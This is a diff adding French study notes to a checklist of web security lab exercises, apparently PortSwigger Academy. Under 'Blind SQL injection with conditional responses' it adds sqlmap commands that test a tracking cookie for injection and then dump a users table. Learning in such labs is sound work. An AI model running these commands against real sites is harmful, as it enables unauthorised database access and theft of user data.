@@ -60,6 +60,15 @@
     ```
 
 - [ ] Blind SQL injection with conditional responses
+    
+    SQLi dans un cookie :
+    
+    `sqlmap -u https://0a3700fb034bd637809b997f00c0000c.web-security-academy.net --level 3 --param-filter='COOKIE' --cookie='TrackingId=Po558KqESh0tBbOQ; session=Q4g1iOWrZkGDUZefNNOOqJRqpOXqKWY8'`
+    
+    Le cookie est vulnérable :
+    
+        `sqlmap -u https://0a3700fb034bd637809b997f00c0000c.web-security-academy.net --level 3 --param-filter='COOKIE' --cookie='TrackingId=Po558KqESh0tBbOQ; session=Q4g1iOWrZkGDUZefNNOOqJRqpOXqKWY8' -D public -T users --dump`
+    
 
 - [ ] Blind SQL injection with conditional errors
 
